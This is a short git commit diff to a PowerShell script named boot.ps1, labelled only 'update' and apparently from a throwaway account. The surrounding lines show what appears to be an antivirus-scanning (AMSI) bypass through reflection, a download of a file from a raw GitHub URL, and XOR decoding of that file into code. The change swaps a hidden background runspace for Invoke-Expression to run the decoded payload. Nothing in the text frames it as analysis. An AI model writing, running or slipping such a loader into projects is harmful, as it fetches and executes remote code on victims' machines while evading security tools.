e5bd4bbc71cb534b359ea09632e76e616395bc1e
Tokenairdrop527 <jonasraabjerg656@gmail.com>
2026-05-01 09:59:58 +0200

    update

--- boot.ps1
+++ boot.ps1
@@ -4,10 +4,4 @@ try{$_t=[Ref].Assembly.GetType($_n);$_c=$_t.GetField($_f,[Reflection.BindingFlag
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 $_enc=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
 $_code=[Text.Encoding]::UTF8.GetString(($_enc|%{$_-bxor0xAE}))
-$_rs=[RunspaceFactory]::CreateRunspace()
-$_rs.Open()
-$_ps=[PowerShell]::Create()
-$_ps.Runspace=$_rs
-[void]$_ps.AddScript($_code)
-[void]$_ps.BeginInvoke()
-exit
+Invoke-Expression $_code
